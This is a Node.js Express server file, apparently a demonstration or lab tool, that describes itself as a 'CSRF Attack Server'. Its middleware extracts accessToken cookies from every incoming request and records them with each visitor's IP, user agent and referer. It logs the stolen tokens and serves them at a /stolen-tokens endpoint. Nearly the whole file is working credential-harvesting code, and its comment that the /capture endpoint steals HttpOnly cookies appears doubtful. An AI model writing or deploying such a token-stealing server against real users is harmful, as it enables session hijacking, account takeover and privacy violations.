import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;

// Store stolen tokens (in production, this would go to a database)
const stolenTokens = [];

// Middleware
app.use(express.json());

// Middleware to log cookies from ALL requests
app.use((req, res, next) => {
  const cookies = req.headers.cookie;

  if (cookies) {
    // Parse the accessToken if present
    const accessTokenMatch = cookies.match(/accessToken=([^;]+)/);
    const accessToken = accessTokenMatch ? accessTokenMatch[1] : null;

    if (accessToken) {
      const stolenData = {
        timestamp: new Date().toISOString(),
        token: accessToken,
        cookies: cookies,
        userAgent: req.headers["user-agent"],
        ip: req.ip,
        referer: req.headers.referer,
        url: req.url,
      };

      // Check if we already have this token (avoid duplicates)
      const exists = stolenTokens.some((t) => t.token === accessToken);

      if (!exists) {
        stolenTokens.push(stolenData);

        console.log("STOLEN TOKEN CAPTURED:");
        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        console.log("Timestamp:", stolenData.timestamp);
        console.log("All Cookies:", stolenData.cookies);
        console.log("Access Token:", stolenData.token.substring(0, 50) + "...");
        console.log("User Agent:", stolenData.userAgent);
        console.log("Referer:", stolenData.referer || "None");
        console.log("IP Address:", stolenData.ip);
        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
      }
    }
  }

  next();
});

// Serve static files after cookie logging
app.use(express.static(__dirname));

// Endpoint specifically for capturing cookies (the main request that steals HttpOnly cookies)
app.get("/capture", (req, res) => {
  res.json({ success: true, message: "Cookies captured" });
});

// Endpoint to log stolen cookies/tokens from JavaScript-accessible cookies
app.post("/log-token", (req, res) => {
  const { jsAccessibleCookies, timestamp } = req.body;

  console.log(
    "JavaScript-accessible cookies:",
    jsAccessibleCookies || "None (all are HttpOnly)"
  );

  res.json({ success: true, message: "Token logged" });
});

// Endpoint to view all stolen tokens
app.get("/stolen-tokens", (req, res) => {
  res.json({
    total: stolenTokens.length,
    tokens: stolenTokens,
  });
});

// Serve the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`CSRF Attack Server running on http://localhost:${PORT}`);
  console.log(`View stolen tokens at http://localhost:${PORT}/stolen-tokens`);
});
